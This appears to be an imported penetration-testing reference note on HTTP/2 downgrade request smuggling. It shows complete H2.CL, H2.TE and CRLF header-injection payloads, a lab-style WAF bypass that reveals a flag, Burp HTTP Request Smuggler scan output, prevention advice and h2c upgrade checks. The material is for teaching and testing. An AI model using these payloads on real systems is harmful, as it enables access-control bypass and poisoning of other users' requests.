---
technique: "HTTP/2 Downgrading"
family: "http-protocol"
severity_hint: "medium"
tags: []
source: "_raw/Web attacks/Web Attacks/HTTP Attacks/HTTP 2 Downgrading.md"
curator_version: 2
review_status: imported-unreviewed
---

# HTTP/2 Downgrading

> Family: **http-protocol** · Severity hint: **medium** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: Burp HTTP Request Smuggler.

## Overview

HTTP/2 downgrading happens when a reverse proxy speaks HTTP/2 to clients but HTTP/1.1 to the backend, rewriting every request between the two protocols. Because HTTP/2 is binary and header-length-prefixed while HTTP/1.1 is string-based and delimiter-based (CRLF, colons, `Content-Length`/`Transfer-Encoding`), a proxy that doesn't validate its rewrite carefully can be tricked into producing a desynchronized HTTP/1.1 stream — reintroducing request smuggling in a protocol pairing that's supposed to make it "almost impossible."

HTTP/2 improves transport performance over HTTP/1.1 while remaining backward compatible — methods, headers, etc. all still exist, and proxies like Burp show no visible difference since the same logical data is exchanged. The key technical differences that matter for security:

- HTTP/1.1 is string-based; HTTP/2 is binary.
- HTTP/2 allows the server to push content to the client without a prior request (useful for static resources, scripts, images).
- An HTTP/1.1 request/response is represented in HTTP/2 using `pseudo-headers`:

```python
GET /index.php HTTP/1.1
Host: http2.htb
```

becomes

```
:method GET
:path /index.php
:authority http2.htb
:scheme http
```

Per [RFC 9113 §8.3.1](https://datatracker.ietf.org/doc/html/rfc9113#name-request-pseudo-header-field), the request pseudo-headers are:

- `:method`: the HTTP method
- `:scheme`: the protocol scheme (typically `http` or `https`)
- `:authority`: similar to the HTTP `Host` header
- `:path`: the requested path including the query string

Burp still displays requests in HTTP/1.1 format, but Burp Repeater's Inspector panel shows the raw HTTP/2 pseudo-headers.

Since HTTP/2 transmits the body as binary data frames with a built-in length field, `chunked` transfer-encoding is no longer supported and there's no ambiguous length calculation — so request smuggling is nearly impossible *if HTTP/2 is used correctly end-to-end*. The vulnerabilities below all stem from a reverse proxy breaking that guarantee by downgrading to HTTP/1.1.

## Downgrading Technique

Downgrading happens when HTTP clients talk HTTP/2 to the reverse proxy, but the reverse proxy and the web server behind it talk HTTP/1.1: the proxy rewrites every incoming HTTP/2 request to HTTP/1.1, and every HTTP/1.1 response back to HTTP/2 — reintroducing request-smuggling surface.

### H2.CL

Per the [HTTP/2 RFC](https://datatracker.ietf.org/doc/html/rfc7540):

```
A request or response that includes a payload body can include a content-length header field.

A request or response is also malformed if the value of a content-length header field does not equal the sum of the DATA frame payload lengths that form the body.
```

A `Content-Length` header is explicitly allowed in HTTP/2, provided it's correct. If the reverse proxy doesn't validate that the provided CL header is actually correct, and rewrites the request to HTTP/1.1 using the faulty value anyway, request smuggling becomes possible — an `H2.CL` vulnerability. Example attacker HTTP/2 request (header names in `red`, values in `green`, body in `yellow` conceptually):

```
:method POST
:path /
:authority http2.htb
:scheme http
content-length 0
GET /smuggled HTTP/1.1
Host: http2.htb
```

A vulnerable reverse proxy trusts the provided `content-length 0` and rewrites this to the following HTTP/1.1 TCP stream — where the "body" is actually a second, smuggled request:

```
POST / HTTP/1.1
Host: http2.htb
Content-Length: 0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### H2.TE

Per the RFC: *"The 'chunked' transfer encoding defined in [Section 4.1 of [RFC7230]] MUST NOT be used in HTTP/2."*

If a reverse proxy fails to reject HTTP/2 requests carrying a `transfer-encoding` header and uses it when rewriting to HTTP/1.1, request smuggling is achievable with a request like:

```python
:method POST
:path /
:authority http2.htb
:scheme http
transfer-encoding chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

A vulnerable reverse proxy produces:

```
POST / HTTP/1.1
Host: http2.htb
Transfer-Encoding: chunked
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

The proxy adds the `Content-Length` header itself during rewriting to tell the backend the body length — but since `Transfer-Encoding` takes precedence over `Content-Length` in HTTP/1.1, the web server treats the first request as chunked, and the "0\r\n\r\n" terminates it early, exposing the smuggled second request.

### Worked example — WAF bypass via H2.CL

<aside>
💡

Make sure to uncheck the `Update Content-Length` option in Burp Repeater when crafting these requests manually.

</aside>

Suppose a flag is revealed by requesting with the GET parameter `reveal_flag=1`, but a WAF blocks any request containing that parameter. An `H2.CL` desync bypasses it — smuggle the blocked request inside what the WAF sees as an empty-bodied, unrelated POST:

```python
POST /index.php HTTP/2
Host: http2.htb
Content-Length: 0

POST /index.php?reveal_flag=1 HTTP/1.1
Host: http2.htb
```

This bypasses the WAF (which only inspects the outer HTTP/2 request) and the backend processes the smuggled request instead. To see the response to the smuggled request, use Burp tab groups to send multiple requests over the same TCP connection. Keep the syntax of the smuggled request valid by hiding its first line inside a dummy trailing header — the mandatory `Host` header of the *next* real request on the connection will get appended to it:

```python
POST /index.php HTTP/2
Host: http2.htb
Content-Length: 0

POST /index.php?reveal_flag=1 HTTP/1.1
Foo: 

```

## Further H2 Vulns

The reverse proxy's rewriting isn't only vulnerable when `Content-Length`/`Transfer-Encoding` are present directly — differences between how HTTP/1.1 and HTTP/2 represent header data can also desynchronize the rewrite.

### Foundation

HTTP/2's binary representation means headers can, in theory, contain arbitrary characters that HTTP/1.1 would forbid — notably CRLF (`\r\n`), which HTTP/1.1 can never contain inside a header value. Per spec:

```
Failure to validate fields can be exploited for request smuggling attacks.
In particular, unvalidated fields might enable attacks when messages are forwarded using HTTP/1.1,
where characters such as carriage return (CR), line feed (LF), and COLON are used as delimiters.
Implementations MUST perform the following minimal validation of field names and values:

- A field name MUST NOT contain characters in the ranges 0x00-0x20, 0x41-0x5a, or 0x7f-0xff (all ranges inclusive). This specifically excludes all non-visible ASCII characters, ASCII SP (0x20), and uppercase characters ('A' to 'Z', ASCII 0x41 to 0x5a).

- With the exception of pseudo-header fields, which have a name that starts with a single colon, field names MUST NOT include a colon (ASCII COLON, 0x3a).

- A field value MUST NOT contain the zero value (ASCII NUL, 0x00), line feed (ASCII LF, 0x0a), or carriage return (ASCII CR, 0x0d) at any position.

- A field value MUST NOT start or end with an ASCII whitespace character (ASCII SP or HTAB, 0x20 or 0x09).

<SNIP>

A request or response that contains a field that violates any of these conditions MUST be treated as malformed.
In particular, an intermediary that does not process fields when forwarding messages MUST NOT
forward fields that contain any of the values that are listed as prohibited above.
```

If a reverse proxy skips or mis-implements this validation, injecting CR/LF/`:` into an HTTP/2 field can forge an `H2.TE` desync via any of the following vectors.

### H2.TE — Request Header Injection

```
:method POST
:path /
:authority http2.htb
:scheme http
dummy asd\r\nTransfer-Encoding: chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

The `dummy` header's value contains a literal `\r\n` — meaningless in HTTP/2 but not sanitized by a vulnerable proxy — so the rewrite splits it into two real HTTP/1.1 headers:

```
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### H2.TE — Header Name Injection

If the proxy fails to validate HTTP/2 header *names* (not just values) before rewriting:

```
:method POST
:path /
:authority http2.htb
:scheme http
dummy: asd\r\nTransfer-Encoding chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

produces the same desynchronized stream:

```
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### H2.TE — Request Line Injection

Pseudo-headers are special in HTTP/2 and may not get the same validation as regular headers — worth testing separately. If the proxy doesn't validate pseudo-headers before rewriting:

```
:method POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd
:path /
:authority http2.htb
:scheme http
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

Here the `:method` pseudo-header's value is itself `POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd`. A vulnerable proxy produces:

```
POST / HTTP/1.1
Transfer-Encoding: chunked
Dummy: asd / HTTP/1.1
Host: http2.htb
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

## Tools & Prevention

### Tools of the Trade

**HTTP Request Smuggler** (Burp extension) automates `CL.0`-style desync scanning (the same class as `H2.CL` above — called `CL.0` because the `Content-Length` is set to 0 while the body carries the smuggled request):

```python
GET /index.php?param1=HelloWorld HTTP/2
Host: http2.htb
```

Right-click the request → send to HTTP Request Smuggler → leave the default settings and press Enter to start the scan. Results appear under `Extensions > Installed > HTTP Request Smuggler > Output`:

```
Queueing reuest scan: CL.0
Found issue: CL.0 desync: h2CL|TRACE /
Target: https://172.17.0.2
HTTP Request Smuggler repeatedly issued the attached request. After 1 attempts, it got a response that appears to have been poisoned by the body of the previous request. For further details and information on remediation, please refer to https://portswigger.net/research/browser-powered-desync-attacks
Evidence:
======================================
GET /index.php HTTP/2
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com

======================================
POST /index.php HTTP/1.1
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

TRACE / HTTP/1.1
X-YzBqv:
======================================
POST /index.php HTTP/1.1
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

TRACE / HTTP/1.1
X-YzBqv:
======================================
```

To manually verify a `CL.0` finding, replay the two requests from the scan output over the same connection (uncheck `Update Content-Length` in Repeater):

```
POST /index.php HTTP/1.1
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

TRACE / HTTP/1.1
X-YzBqv:
```

```
GET /index.php HTTP/2
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
```

A `405` status on the second response confirms the smuggled `TRACE` request reached the backend and influenced the second request — proving the desync.

### Prevention

The root cause across every technique above is HTTP/2-to-HTTP/1.1 downgrading itself. Reverse proxies should not rewrite HTTP/2 requests to HTTP/1.1 at all — HTTP/2 should be implemented end-to-end so no rewriting is ever required. Because the two protocol versions differ enough that minor spec deviations in either the reverse proxy or the web server can desynchronize the stream, proper end-to-end HTTP/2 configuration prevents this entire class of issues.

## HackTricks methodology enrichment — H2C upgrade boundaries

H2C is HTTP/2 over cleartext. Some reverse proxies forward an
`Upgrade: h2c` request without understanding that the upgraded connection can
carry additional HTTP/2 requests, creating a route or access-control bypass.

1. Confirm an HTTP/1.1 cleartext hop or backend is plausible; ordinary browser
   HTTP/2 over TLS does not use the h2c upgrade flow.
2. Send a single benign upgrade probe with `Upgrade: h2c`,
   `Connection: Upgrade, HTTP2-Settings`, and a syntactically valid
   `HTTP2-Settings` value. Record whether the edge rejects, strips, forwards, or
   returns `101 Switching Protocols`.
3. Compare the same public resource normally and through the upgraded path. A
   `101` alone is not a vulnerability; prove that subsequent requests bypass a
   security control or reach a backend route that the proxy should mediate.
4. Test WebSocket upgrade handling as a separate parser boundary because some
   proxies treat any successful `101` as a tunnel.

Do not tunnel to internal paths, chain smuggled requests, or reuse another user's
connection without explicit desync authorization. These checks can affect other
users and must use isolated infrastructure or a program-approved low-traffic
window.

HackTricks sources: [Upgrade Header Smuggling](https://hacktricks.wiki/en/pentesting-web/h2c-smuggling.html) and
[Request Smuggling in HTTP/2 Downgrades](https://hacktricks.wiki/en/pentesting-web/http-request-smuggling/request-smuggling-in-http-2-downgrades.html)
([snapshot reviewed](https://github.com/HackTricks-wiki/hacktricks/blob/d7dfcf8fa88bc49160a0fec341b16c763660ee4f/src/pentesting-web/h2c-smuggling.md)).

## Source
Original notes:
- `_raw/Web attacks/Web Attacks/HTTP Attacks/HTTP 2 Downgrading.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/HTTP 2 Downgrading/Introduction to HTTP2.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/HTTP 2 Downgrading/HTTP 2 Downgrading.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/HTTP 2 Downgrading/Further H2 Vulnerabilities.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/HTTP 2 Downgrading/Tools & Prevention.md`
